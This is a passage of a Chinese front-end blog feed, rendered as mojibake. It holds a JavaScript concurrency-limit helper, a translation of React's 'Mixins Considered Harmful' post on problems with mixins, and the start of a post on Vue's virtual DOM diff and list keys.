class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> mapLimit = <span class="function">(<span class="params">list, limit, asyncHandle</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">let</span> recursion = <span class="function">(<span class="params">arr</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> asyncHandle(arr.shift())</span><br><span class="line">.then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (arr.length !== <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> recursion(arr) <span class="comment">// æ•°ç»„æœªè¿­ä»£å®Œï¼Œç»§ç»­è¯·æ±‚</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> listCopy = [].concat(list)b</span><br><span class="line"><span class="keyword">let</span> asyncList = [] <span class="comment">// æ­£åœ¨è¿›è¡Œçš„æ‰€æœ‰å¹¶å‘å¼‚æ­¥æ“ä½œ</span></span><br><span class="line"><span class="keyword">while</span> (limit--) &#123;</span><br><span class="line">asyncList.push(recursion(listCopy))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">Promise</span>.all(asyncList) <span class="comment">// æ‰€æœ‰å¹¶å‘å¼‚æ­¥æ“ä½œéƒ½å®Œæˆåï¼Œæœ¬æ¬¡å¹¶å‘æ§åˆ¶è¿­ä»£å®Œæˆ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://github.com/SunshowerC/blog/issues/2" target="_blank" rel="noopener">15è¡Œä»£ç å®ç°å¹¶å‘æ§åˆ¶</a></li></ul>]]></content>
      
      <categories>
          
          <category> Bug </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mixin Considered Harmful(è¯‘æ–‡)</title>
      <link href="/2019/12/19/Mixin/"/>
      <url>/2019/12/19/Mixin/</url>
      <content type="html"><![CDATA[<blockquote><p>æœ€è¿‘åˆšæ¥è§¦Vueï¼Œä¸€ä¸ªVueå®ä¾‹æ€»æ˜¯è°ƒç”¨ä¸€ä¸ªæœªå®šä¹‰çš„æ–¹æ³•ï¼Œä»”ç»†ä¸€çœ‹æ˜¯å¼•ç”¨äº†Mixinï¼Œä¸çœ‹ä¸çŸ¥é“ï¼Œä¸€çœ‹å“ä¸€è·³ã€‚ä»£ç é‡Œå¥½å¤šMixinå•Šã€‚ä¸€ä¸ªMixiné‡Œå¯èƒ½åˆå¼•ç”¨äº†å…¶ä»–Mixinï¼Œæœ€åä½ æ²¡åŠæ³•çŸ¥é“Mixiné‡Œçš„æ–¹æ³•éƒ½è¢«å“ªäº›ç»„ä»¶å¼•ç”¨äº†ã€‚éš¾æå“¦â€¦<br><br>ä¹‹å‰å†™Reactçš„æ—¶å€™éƒ½ä¼šå°è£…æˆç»„ä»¶ï¼Œæ¥å®ç°ä»£ç å¤ç”¨ï¼ŒReactå€’æ˜¯æ²¡æœ‰Mixinsè¿™ä¸ªæ¦‚å¿µã€‚Reactå®˜ç½‘å€’æ˜¯çœ‹åˆ°ä¸€ç¯‡æ–‡ç«  - <a href="https://reactjs.org/blog/2016/07/13/mixins-considered-harmful.html" target="_blank" rel="noopener">Mixins Considered Harmful</a>ã€‚ç½‘ä¸Šæ‰¾åˆ°äº†å®ƒçš„<a href="https://lizhiyao.github.io/2018/01/05/f2e/mixins-considered-harmful/" target="_blank" rel="noopener">ä¸­æ–‡ç‰ˆ</a>ï¼Œåœ¨è¿™é‡Œç•™ä¸ªè®°å½•ã€‚<br>ï¼ˆåè®°ï¼šåæ¥è§‰å¾—MixinçœŸé¦™ï¼ä¸€äº›ç®€å•é¡µé¢ï¼Œç®€å•å›ºå®šé€»è¾‘ï¼Œç”¨Mixinä¼šå¾ˆæ–¹ä¾¿ï¼‰</p></blockquote><p><br></p><h3 id="Mixinsæˆ–è®¸ä¸å¤ªå¥½"><a href="#Mixinsæˆ–è®¸ä¸å¤ªå¥½" class="headerlink" title="Mixinsæˆ–è®¸ä¸å¤ªå¥½"></a><strong>Mixinsæˆ–è®¸ä¸å¤ªå¥½</strong></h3><p>â€œå¦‚ä½•åœ¨ä¸åŒçš„ç»„ä»¶ä¹‹é—´è¿›è¡Œä»£ç å¤ç”¨ï¼Ÿâ€æ˜¯äººä»¬åœ¨å­¦ä¹  React æ—¶é¦–å…ˆè¦é—®çš„é—®é¢˜ä¹‹ä¸€ï¼Œæˆ‘ä»¬çš„ç­”æ¡ˆå§‹ç»ˆæ˜¯ä½¿ç”¨ç»„ä»¶ç»„åˆæ¥é‡ç”¨ä»£ç ã€‚ä½ å¯ä»¥å®šä¹‰ä¸€ä¸ªç»„ä»¶å¹¶åœ¨å…¶ä»–å‡ ä¸ªç»„ä»¶ä¸­ä½¿ç”¨å®ƒã€‚</p><p>æŸç§ç¡®å®šçš„æ¨¡å¼é€šè¿‡ç”¨ç»„åˆçš„æ–¹å¼è¿›è¡Œè§£å†³å¹¶ä¸æ€»æ˜¯æ˜¾è€Œæ˜“è§çš„ã€‚React å—å‡½æ•°å¼ç¼–ç¨‹çš„å½±å“ï¼Œä½†è¿›å…¥äº†ä»¥é¢å‘å¯¹è±¡åº“ä¸ºä¸»çš„é¢†åŸŸã€‚Facebook å†…éƒ¨å’Œå¤–éƒ¨çš„å·¥ç¨‹å¸ˆå¾ˆéš¾æ”¾å¼ƒä»–ä»¬ä¹ æƒ¯çš„æ¨¡å¼ã€‚</p><p>ä¸ºäº†ç®€åŒ–æœ€åˆçš„é‡‡ç”¨å’Œå­¦ä¹ ï¼Œæˆ‘ä»¬åœ¨ React ä¸­åŠ å…¥äº†ä¸€äº›â€œé€ƒç”Ÿâ€åŠŸèƒ½ã€‚mixin ç³»ç»Ÿå°±æ˜¯å…¶ä¸­ä¸€ç§é€ƒç”Ÿæ–¹æ³•ï¼Œå®ƒçš„ç›®æ ‡æ˜¯å½“ä½ ä¸çŸ¥é“å¦‚ä½•é€šè¿‡ç»„åˆè§£å†³é—®é¢˜æ—¶ï¼Œç»™ä½ å¦å¤–ä¸€ç§åœ¨ç»„ä»¶ä¹‹é—´é‡ç”¨ä»£ç çš„æ–¹æ³•ã€‚</p><p>React å·²ç»å‘å¸ƒä¸‰å¹´äº†ï¼Œå‰ç«¯é¢†åŸŸçš„æŠ€æœ¯åœ¨è¿™ä¸‰å¹´ä¸­ä¹Ÿå‘ç”Ÿäº†ç¿»å¤©è¦†åœ°çš„å˜åŒ–ã€‚ç°åœ¨å¤šä¸ªç”¨äºæ„å»ºç”¨æˆ·ç•Œé¢çš„å‰ç«¯æ¡†æ¶éƒ½é‡‡ç”¨äº†ç±»ä¼¼äº React çš„ç»„ä»¶æ¨¡å‹ã€‚ä½¿ç”¨åŸºäºç»§æ‰¿çš„ç»„åˆå£°æ˜å¼çš„æ„å»ºç”¨æˆ·ç•Œé¢ï¼Œä¸å†æ˜¯æ–°é²œäº‹ç‰©ã€‚æˆ‘ä»¬å¯¹ React ç»„ä»¶æ¨¡å‹ä¹Ÿæ›´åŠ è‡ªä¿¡ï¼Œæˆ‘ä»¬åœ¨å†…éƒ¨å’Œç¤¾åŒºéƒ½çœ‹åˆ°äº†å®ƒçš„è®¸å¤šåˆ›é€ æ€§çš„ç”¨é€”ã€‚</p><p>åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å°†æ€è€ƒé€šå¸¸æ˜¯ç”± mixin å¼•èµ·çš„é—®é¢˜ã€‚ç„¶åï¼Œæˆ‘ä»¬å°†ä¸ºç›¸åŒçš„ç”¨ä¾‹æå‡ºå‡ ç§æ›¿ä»£æ¨¡å¼ã€‚æˆ‘ä»¬å‘ç°éšç€é¡¹ç›®ä»£ç å¤æ‚åº¦çš„å¢åŠ ï¼Œè¿™äº›æ›¿ä»£çš„æ¨¡å¼çš„å¯æ‰©å±•æ€§æ¯”ä½¿ç”¨ mixin æ›´å¥½ã€‚</p><p><br></p><h3 id="Reactä¸ºä»€ä¹ˆä¸ç”¨Mixin"><a href="#Reactä¸ºä»€ä¹ˆä¸ç”¨Mixin" class="headerlink" title="Reactä¸ºä»€ä¹ˆä¸ç”¨Mixin"></a><strong>Reactä¸ºä»€ä¹ˆä¸ç”¨Mixin</strong></h3><p>åœ¨ Facebookï¼ŒReact çš„ä½¿ç”¨é‡å·²ç»ä»å‡ ä¸ªç»„ä»¶å¢é•¿åˆ°äº†æˆåƒä¸Šä¸‡ä¸ªã€‚è¿™ç»™äº†æˆ‘ä»¬ä¸€ä¸ªå»æ€è€ƒäººä»¬è¯¥å¦‚ä½•æ›´å¥½çš„ä½¿ç”¨ React çš„çª—å£ã€‚ç”±äºå£°æ˜æ€§æ¸²æŸ“å’Œè‡ªä¸Šè€Œä¸‹çš„æ•°æ®æµï¼Œè®¸å¤šå›¢é˜Ÿåœ¨é‡‡ç”¨ React å»å®ç°ä¸€äº›æ–°åŠŸèƒ½æ—¶ï¼Œèƒ½å¤Ÿè§£å†³äº†å¾ˆå¤šä¹‹å‰éš¾ä»¥å»è§£å†³çš„ bugã€‚</p><p>ç„¶è€Œï¼Œä½¿ç”¨ React çš„ä¸€äº›ä»£ç ä¸å¯é¿å…åœ°å˜å¾—éš¾ä»¥ç†è§£ã€‚æœ‰æ—¶å€™ï¼ŒReact å›¢é˜Ÿä¼šçœ‹åˆ°å¼€å‘è€…ä¸æ•¢å»ç¢°æŸäº›é¡¹ç›®ä¸­çš„ç»„ä»¶ã€‚è¿™äº›ç»„ä»¶ç»´æŠ¤èµ·æ¥å¾ˆå®¹æ˜“å‡º bugï¼Œå¯¹æ–°å¼€å‘äººå‘˜é€ æˆè´Ÿæ‹…ï¼Œæœ€ç»ˆç»„ä»¶ä¼šå˜å¾—è®©åˆ›å»ºè¿™ä¸ªç»„ä»¶çš„äººéƒ½éš¾ä»¥å»ç»´æŠ¤ã€‚è¿™ç§å·¨å¤§çš„å¼€å‘æˆæœ¬å¤§éƒ¨åˆ†æ˜¯ç”± mixin å¼•èµ·çš„ã€‚å½“æ—¶ï¼Œæˆ‘å¹¶æ²¡æœ‰åœ¨Facebookå·¥ä½œï¼Œä½†æ˜¯åœ¨å†™ä¸‹äº†æˆ‘å¯æ€•çš„ mixin ä¹‹åï¼Œæˆ‘å¾—å‡ºäº†ç›¸åŒçš„ç»“è®ºâ€”Mixinså·²ç»ï¼Œç»„åˆæ°¸ç”Ÿã€‚</p><p>è¿™å¹¶ä¸æ„å‘³ç€ mixin æœ¬èº«å°±æ˜¯åçš„ã€‚å¼€å‘è€…ä»¬æˆåŠŸåœ°åœ¨ä¸åŒçš„è¯­è¨€å’ŒèŒƒä¾‹ä¸­ä½¿ç”¨ mixinï¼ŒåŒ…æ‹¬åœ¨ä¸€äº›å‡½æ•°å¼ç¼–ç¨‹è¯­è¨€ä¸­ã€‚åœ¨ Facebookï¼Œæˆ‘ä»¬å¹¿æ³›ä½¿ç”¨ Hack ä¸­ä¸ mixin éå¸¸ç›¸ä¼¼çš„ç‰¹æ€§ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬ä¾æ—§è®¤ä¸º mixin åœ¨ React ä»£ç åº“ä¸­æ˜¯ä¸å¿…è¦çš„å’Œæœ‰é—®é¢˜çš„ã€‚ä¸‹é¢çš„å†…å®¹æ˜¯æˆ‘ä»¬è¿™æ ·è®¤ä¸ºçš„åŸå› ã€‚</p><p><br></p><h3 id="Mixin-å¼•å…¥äº†éšå¼ä¾èµ–å…³ç³»"><a href="#Mixin-å¼•å…¥äº†éšå¼ä¾èµ–å…³ç³»" class="headerlink" title="Mixin å¼•å…¥äº†éšå¼ä¾èµ–å…³ç³»"></a><strong>Mixin å¼•å…¥äº†éšå¼ä¾èµ–å…³ç³»</strong></h3><p>æœ‰æ—¶ä¸€ä¸ªç»„ä»¶ä¾èµ–äºmixinä¸­å®šä¹‰çš„æŸä¸ªæ–¹æ³•ï¼Œæ¯”å¦‚getClassNameï¼ˆï¼‰ã€‚æœ‰æ—¶å€™æ˜¯ç›¸åçš„ï¼Œmixinåœ¨ç»„ä»¶ä¸Šè°ƒç”¨renderHeaderï¼ˆï¼‰æ–¹æ³•ã€‚ JavaScriptæ˜¯ä¸€ç§åŠ¨æ€è¯­è¨€ï¼Œæ‰€ä»¥å¾ˆéš¾æ‰§è¡Œæˆ–è®°å½•è¿™äº›ä¾èµ–å…³ç³»ã€‚</p><p>Mixinæ‰“ç ´äº†å¸¸è§ä¸”é€šå¸¸å®‰å…¨çš„å‡è®¾ï¼Œå³å¯ä»¥é€šè¿‡åœ¨ç»„ä»¶æ–‡ä»¶ä¸­æœç´¢å…¶å‡ºç°æ¥é‡å‘½åçŠ¶æ€é”®æˆ–æ–¹æ³•ã€‚ä½ å¯èƒ½ä¼šå†™ä¸€ä¸ªæœ‰çŠ¶æ€çš„ç»„ä»¶ï¼Œç„¶åä½ çš„åŒäº‹å¯èƒ½ä¼šæ·»åŠ ä¸€ä¸ªè¯»å–è¿™ä¸ªçŠ¶æ€çš„mixinã€‚åœ¨å‡ ä¸ªæœˆå†…ï¼Œæ‚¨å¯èƒ½éœ€è¦å°†è¯¥çŠ¶æ€ç§»è‡³çˆ¶ç»„ä»¶ï¼Œä»¥ä¾¿ä¸å…„å¼Ÿç»„ä»¶å…±äº«ã€‚ä½ ä¼šè®°å¾—æ›´æ–°mixinæ¥è¯»å–é“å…·å—ï¼Ÿå¦‚æœç°åœ¨å…¶ä»–ç»„ä»¶ä¹Ÿä½¿ç”¨è¿™ä¸ªmixinå‘¢ï¼Ÿ</p><p>è¿™äº›éšå«çš„ä¾èµ–æ€§ä½¿æ–°å›¢é˜Ÿæˆå‘˜éš¾ä»¥è´¡çŒ®ä»£ç åº“ã€‚ä¸€ä¸ªç»„ä»¶çš„renderï¼ˆï¼‰æ–¹æ³•å¯èƒ½ä¼šå¼•ç”¨ä¸€äº›æœªåœ¨è¯¥ç±»ä¸Šå®šä¹‰çš„æ–¹æ³•ã€‚ç§»é™¤å®‰å…¨å—ï¼Ÿä¹Ÿè®¸å®ƒæ˜¯åœ¨ä¸€ä¸ªmixinä¸­å®šä¹‰çš„ã€‚ä½†æ˜¯å…¶ä¸­å“ªä¸€ä¸ªå‘¢ï¼Ÿæ‚¨éœ€è¦å‘ä¸Šæ»šåŠ¨åˆ°mixinåˆ—è¡¨ï¼Œæ‰“å¼€æ¯ä¸ªæ–‡ä»¶ï¼Œç„¶åæŸ¥æ‰¾æ­¤æ–¹æ³•ã€‚æ›´ç³Ÿçš„æ˜¯ï¼Œmixinå¯ä»¥æŒ‡å®šä»–ä»¬è‡ªå·±çš„mixinï¼Œæ‰€ä»¥æœç´¢å¯ä»¥å¾ˆæ·±å…¥ã€‚</p><p>mixinç»å¸¸ä¾èµ–äºå…¶ä»–çš„mixinï¼Œè€Œåˆ é™¤å…¶ä¸­çš„ä¸€ä¸ªä¼šæ‰“ç ´å¦ä¸€ä¸ªã€‚åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œå‘Šè¯‰æ•°æ®å¦‚ä½•è¿›å‡ºmixinæ˜¯éå¸¸æ£˜æ‰‹çš„ï¼Œä»¥åŠå®ƒä»¬çš„ä¾èµ–å…³ç³»å›¾æ˜¯ä»€ä¹ˆæ ·çš„ã€‚ä¸ç»„ä»¶ä¸åŒï¼Œmixinä¸æ„æˆå±‚æ¬¡ç»“æ„ï¼šå®ƒä»¬è¢«å¤·ä¸ºå¹³åœ°å¹¶åœ¨ç›¸åŒçš„åç§°ç©ºé—´ä¸­è¿è¡Œã€‚</p><p><br></p><h3 id="Mixinså¯¼è‡´åç§°å†²çª"><a href="#Mixinså¯¼è‡´åç§°å†²çª" class="headerlink" title="Mixinså¯¼è‡´åç§°å†²çª"></a><strong>Mixinså¯¼è‡´åç§°å†²çª</strong></h3><p>ä¸èƒ½ä¿è¯ä¸¤ä¸ªç‰¹å®šçš„mixinå¯ä»¥ä¸€èµ·ä½¿ç”¨ã€‚ä¾‹å¦‚ï¼Œå¦‚æœFluxListenerMixinå®šä¹‰äº†handleChangeï¼ˆï¼‰å’ŒWindowSizeMixinå®šä¹‰äº†handleChangeï¼ˆï¼‰ï¼Œåˆ™ä¸èƒ½ä¸€èµ·ä½¿ç”¨å®ƒä»¬ã€‚ä½ ä¹Ÿä¸èƒ½åœ¨ä½ è‡ªå·±çš„ç»„ä»¶ä¸Šå®šä¹‰ä¸€ä¸ªå¸¦æœ‰è¿™ä¸ªåå­—çš„æ–¹æ³•ã€‚</p><p>å¦‚æœä½ æ§åˆ¶æ··å…¥ä»£ç ï¼Œè¿™ä¸æ˜¯ä»€ä¹ˆå¤§ä¸äº†çš„äº‹æƒ…ã€‚å¦‚æœå‘ç”Ÿå†²çªï¼Œå¯ä»¥åœ¨å…¶ä¸­ä¸€ä¸ªmixinä¸Šé‡å‘½åè¯¥æ–¹æ³•ã€‚ç„¶è€Œï¼Œè¿™å¾ˆæ£˜æ‰‹ï¼Œå› ä¸ºä¸€äº›ç»„ä»¶æˆ–å…¶ä»–mixinå¯èƒ½å·²ç»ç›´æ¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œä½ ä¹Ÿéœ€è¦æ‰¾åˆ°å¹¶ä¿®å¤è¿™äº›è°ƒç”¨ã€‚</p><p>å¦‚æœä½ çš„åå­—ä¸ç¬¬ä¸‰æ–¹åŒ…ä¸­çš„mixinæœ‰å†²çªï¼Œä½ ä¸èƒ½åªé‡å‘½åä¸€ä¸ªæ–¹æ³•ã€‚ç›¸åï¼Œæ‚¨å¿…é¡»åœ¨æ‚¨çš„ç»„ä»¶ä¸Šä½¿ç”¨å°´å°¬çš„æ–¹æ³•åç§°ä»¥é¿å…å†²çªã€‚</p><p>mixinä½œè€…çš„æƒ…å†µå¹¶ä¸å¥½ã€‚å³ä½¿å‘mixinæ·»åŠ ä¸€ä¸ªæ–°çš„æ–¹æ³•æ€»æ˜¯ä¸€ä¸ªæ½œåœ¨çš„é‡å¤§æ”¹å˜ï¼Œå› ä¸ºä¸€ä¸ªåç§°ç›¸åŒçš„æ–¹æ³•å¯èƒ½å·²ç»å­˜åœ¨äºä¸€äº›ä½¿ç”¨å®ƒçš„ç»„ä»¶ï¼Œç›´æ¥æˆ–é€šè¿‡å¦ä¸€ä¸ªmixinã€‚ä¸€æ—¦å†™å…¥ï¼Œmixinå¾ˆéš¾åˆ é™¤æˆ–æ›´æ”¹ã€‚ä¸å¥½çš„æƒ³æ³•ä¸ä¼šè¢«é‡æ„ï¼Œå› ä¸ºé‡æ„é£é™©å¤ªå¤§ã€‚</p><p><br></p><h3 id="Mixinå¯¼è‡´å¤æ‚çš„æ»šé›ªçƒ"><a href="#Mixinå¯¼è‡´å¤æ‚çš„æ»šé›ªçƒ" class="headerlink" title="Mixinå¯¼è‡´å¤æ‚çš„æ»šé›ªçƒ"></a><strong>Mixinå¯¼è‡´å¤æ‚çš„æ»šé›ªçƒ</strong></h3><p>å³ä½¿mixinå¼€å§‹ç®€å•ï¼Œéšç€æ—¶é—´çš„æ¨ç§»ï¼Œå®ƒä»¬å¾€å¾€ä¼šå˜å¾—å¤æ‚ã€‚ä¸‹é¢çš„ä¾‹å­æ˜¯åŸºäºæˆ‘åœ¨ä»£ç åº“ä¸­çœ‹åˆ°çš„çœŸå®åœºæ™¯ã€‚</p><p>ç»„ä»¶éœ€è¦ä¸€äº›çŠ¶æ€æ¥è·Ÿè¸ªé¼ æ ‡æ‚¬åœã€‚ä¸ºäº†ä¿æŒè¿™ä¸ªé€»è¾‘å¯é‡ç”¨ï¼Œä½ å¯ä»¥å°†handleMouseEnterï¼ˆï¼‰ï¼ŒhandleMouseLeaveï¼ˆï¼‰å’ŒisHoveringï¼ˆï¼‰æå–åˆ°ä¸€ä¸ªHoverMixinä¸­ã€‚æ¥ä¸‹æ¥ï¼Œæœ‰äººéœ€è¦å®æ–½ä¸€ä¸ªå·¥å…·æç¤ºã€‚ä»–ä»¬ä¸æƒ³å¤åˆ¶HoverMixinä¸­çš„é€»è¾‘ï¼Œä»¥ä¾¿åˆ›å»ºä½¿ç”¨HoverMixinçš„TooltipMixinã€‚ TooltipMixinè¯»å–HoverMixinåœ¨å…¶componentDidUpdateï¼ˆï¼‰ä¸­æä¾›çš„isHoveringï¼ˆï¼‰ï¼Œå¹¶æ˜¾ç¤ºæˆ–éšè—å·¥å…·æç¤ºã€‚</p><p>å‡ ä¸ªæœˆåï¼Œæœ‰äººæƒ³è®©å·¥å…·æç¤ºæ–¹å‘å¯é…ç½®ã€‚ä¸ºäº†é¿å…ä»£ç é‡å¤ï¼Œä»–ä»¬æ·»åŠ äº†ä¸€ä¸ªåä¸ºgetTooltipOptionsï¼ˆï¼‰çš„æ–°çš„å¯é€‰æ–¹æ³•åˆ°TooltipMixinã€‚åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæ˜¾ç¤ºpopoversçš„ç»„ä»¶ä¹Ÿä½¿ç”¨HoverMixinã€‚ç„¶è€Œï¼Œpopoverséœ€è¦ä¸åŒçš„æ‚¬åœå»¶è¿Ÿã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæœ‰äººå¢åŠ äº†å¯¹å¯é€‰çš„getHoverOptionsï¼ˆï¼‰æ–¹æ³•çš„æ”¯æŒï¼Œå¹¶åœ¨TooltipMixinä¸­å®ç°å®ƒã€‚é‚£äº›æ··åˆç°åœ¨æ˜¯ç´§å¯†è€¦åˆçš„ã€‚</p><p>æ²¡æœ‰æ–°çš„è¦æ±‚ï¼Œè¿™å¾ˆå¥½ã€‚ä½†æ˜¯è¿™ä¸ªè§£å†³æ–¹æ¡ˆä¸èƒ½å¾ˆå¥½åœ°æ‰©å±•ã€‚å¦‚æœä½ æƒ³æ”¯æŒåœ¨å•ä¸ªç»„ä»¶ä¸­æ˜¾ç¤ºå¤šä¸ªå·¥å…·æç¤ºå‘¢ï¼Ÿä½ ä¸èƒ½åœ¨ä¸€ä¸ªç»„ä»¶ä¸­å®šä¹‰ä¸¤æ¬¡ç›¸åŒçš„mixinã€‚å¦‚æœå·¥å…·æç¤ºéœ€è¦åœ¨å¯¼æ¸¸ä¸­è‡ªåŠ¨æ˜¾ç¤ºï¼Œè€Œä¸æ˜¯æ‚¬åœï¼Œæ€ä¹ˆåŠï¼Ÿç¥ä½ å¥½è¿è§£è€¦TooltipMixinä»HoverMixinã€‚å¦‚æœæ‚¨éœ€è¦æ”¯æŒæ‚¬åœåŒºåŸŸå’Œå·¥å…·æç¤ºé”šç‚¹ä½äºä¸åŒç»„ä»¶çš„æƒ…å†µï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿä½ ä¸èƒ½è½»æ˜“åœ°æŠŠæ··å…¥åˆ°çˆ¶ç»„ä»¶ä¸­çš„çŠ¶æ€æå‡èµ·æ¥ã€‚ä¸ç»„ä»¶ä¸åŒï¼Œmixinä¸ä¼šè‡ªç„¶åœ°é€‚åº”è¿™ç§å˜åŒ–ã€‚</p><p>æ¯ä¸€ä¸ªæ–°çš„è¦æ±‚éƒ½ä¼šè®©æ··éŸ³å˜å¾—æ›´éš¾ç†è§£ã€‚ä½¿ç”¨ç›¸åŒmixinçš„ç»„ä»¶è¶Šæ¥è¶Šä¸æ—¶é—´è€¦åˆã€‚ä»»ä½•æ–°çš„èƒ½åŠ›è¢«æ·»åŠ åˆ°ä½¿ç”¨è¯¥mixinçš„æ‰€æœ‰ç»„ä»¶ã€‚å¦‚æœæ²¡æœ‰å¤åˆ¶ä»£ç æˆ–åœ¨mixinä¹‹é—´å¼•å…¥æ›´å¤šçš„ä¾èµ–æ€§å’Œé—´æ¥æ€§ï¼Œå°±æ²¡æœ‰åŠæ³•æ‹†åˆ†mixinçš„â€œæ›´ç®€å•â€çš„éƒ¨åˆ†ã€‚é€æ¸åœ°ï¼Œå°è£…è¾¹ç•Œé€æ¸æ¶ˆå¤±ï¼Œç”±äºå¾ˆéš¾æ”¹å˜æˆ–ç§»é™¤ç°æœ‰çš„æ··åˆï¼Œä»–ä»¬ä¸æ–­å˜å¾—æŠ½è±¡ï¼Œç›´åˆ°æ²¡äººç†è§£å®ƒä»¬æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚</p><p>è¿™äº›ä¸æˆ‘ä»¬åœ¨Reactä¹‹å‰æ„å»ºåº”ç”¨ç¨‹åºçš„é—®é¢˜æ˜¯ä¸€æ ·çš„ã€‚æˆ‘ä»¬å‘ç°å®ƒä»¬æ˜¯é€šè¿‡å£°æ˜æ€§æ¸²æŸ“ï¼Œè‡ªé¡¶å‘ä¸‹çš„æ•°æ®æµå’Œå°è£…ç»„ä»¶æ¥è§£å†³çš„ã€‚åœ¨Facebookä¸Šï¼Œæˆ‘ä»¬ä¸€ç›´åœ¨è¿ç§»æˆ‘ä»¬çš„ä»£ç ä»¥ä½¿ç”¨æ›¿ä»£æ¨¡å¼æ¥æ··åˆï¼Œæˆ‘ä»¬å¯¹ç»“æœæ™®éæ„Ÿåˆ°æ»¡æ„ã€‚ä½ å¯ä»¥é˜…è¯»ä¸‹é¢çš„æ¨¡å¼ã€‚</p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://reactjs.org/blog/2016/07/13/mixins-considered-harmful.html" target="_blank" rel="noopener">Mixins Considered Harmful</a></li><li><a href="https://lizhiyao.github.io/2018/01/05/f2e/mixins-considered-harmful/" target="_blank" rel="noopener">Mixins æˆ–è®¸ä¸å¤ªå¥½</a></li></ul>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Vue Dom Diff(v-forä¸ºä»€ä¹ˆè¦åŠ key)</title>
      <link href="/2019/12/16/Vue-key/"/>
      <url>/2019/12/16/Vue-key/</url>
      <content type="html"><![CDATA[<blockquote><p>key çš„ä½œç”¨ä¸»è¦æ˜¯ç»™ VNode æ·»åŠ å”¯ä¸€æ ‡è¯†ï¼Œé€šè¿‡è¿™ä¸ª keyï¼Œå¯ä»¥æ›´å¿«æ‰¾åˆ°æ–°æ—§ VNode çš„å˜åŒ–ï¼Œä»è€Œè¿›ä¸€æ­¥æ“ä½œã€‚</p></blockquote><h3 id="1-åŸç”ŸDOM-vs-è™šæ‹ŸDOM"><a href="#1-åŸç”ŸDOM-vs-è™šæ‹ŸDOM" class="headerlink" title="1. åŸç”ŸDOM vs è™šæ‹ŸDOM"></a>1. åŸç”ŸDOM vs è™šæ‹ŸDOM</h3><p>è¿™æ˜¯ä¸€ä¸ªæ€§èƒ½ vs. å¯ç»´æŠ¤æ€§çš„å–èˆã€‚æ¡†æ¶çš„æ„ä¹‰åœ¨äºä¸ºä½ æ©ç›–åº•å±‚çš„ DOM æ“ä½œï¼Œè®©ä½ ç”¨æ›´å£°æ˜å¼çš„æ–¹å¼æ¥æè¿°ä½ çš„ç›®çš„ï¼Œä»è€Œè®©ä½ çš„ä»£ç æ›´å®¹æ˜“ç»´æŠ¤ã€‚æ²¡æœ‰ä»»ä½•æ¡†æ¶å¯ä»¥æ¯”çº¯æ‰‹åŠ¨çš„ä¼˜åŒ– DOM æ“ä½œæ›´å¿«ï¼Œå› ä¸ºæ¡†æ¶çš„ DOM æ“ä½œå±‚éœ€è¦åº”å¯¹ä»»ä½•ä¸Šå±‚ API å¯èƒ½äº§ç”Ÿçš„æ“ä½œï¼Œå®ƒçš„å®ç°å¿…é¡»æ˜¯æ™®é€‚çš„ã€‚é’ˆå¯¹ä»»ä½•ä¸€ä¸ª benchmarkï¼Œæˆ‘éƒ½å¯ä»¥å†™å‡ºæ¯”ä»»ä½•æ¡†æ¶æ›´å¿«çš„æ‰‹åŠ¨ä¼˜åŒ–ï¼Œä½†æ˜¯é‚£æœ‰ä»€ä¹ˆæ„ä¹‰å‘¢ï¼Ÿåœ¨æ„å»ºä¸€ä¸ªå®é™…åº”ç”¨çš„æ—¶å€™ï¼Œä½ éš¾é“ä¸ºæ¯ä¸€ä¸ªåœ°æ–¹éƒ½å»åšæ‰‹åŠ¨ä¼˜åŒ–å—ï¼Ÿå‡ºäºå¯ç»´æŠ¤æ€§çš„è€ƒè™‘ï¼Œè¿™æ˜¾ç„¶ä¸å¯èƒ½ã€‚æ¡†æ¶ç»™ä½ çš„ä¿è¯æ˜¯ï¼Œä½ åœ¨ä¸éœ€è¦æ‰‹åŠ¨ä¼˜åŒ–çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä¾ç„¶å¯ä»¥ç»™ä½ æä¾›è¿‡å¾—å»çš„æ€§èƒ½ã€‚</p><h4 id="è™šæ‹ŸDOMçš„ä½œç”¨"><a href="#è™šæ‹ŸDOMçš„ä½œç”¨" class="headerlink" title="è™šæ‹ŸDOMçš„ä½œç”¨"></a>è™šæ‹ŸDOMçš„ä½œç”¨</h4><p>è™šæ‹ŸDOMå°±æ˜¯ä¸€ä¸ªç”¨æ¥æè¿°çœŸå®DOMçš„javaScriptå¯¹è±¡ã€‚</p><p>Virtual DOMçš„ä¸»è¦æ€æƒ³å°±æ˜¯æ¨¡æ‹ŸDOMçš„æ ‘çŠ¶ç»“æ„ï¼Œåœ¨å†…å­˜ä¸­åˆ›å»ºä¿å­˜æ˜ 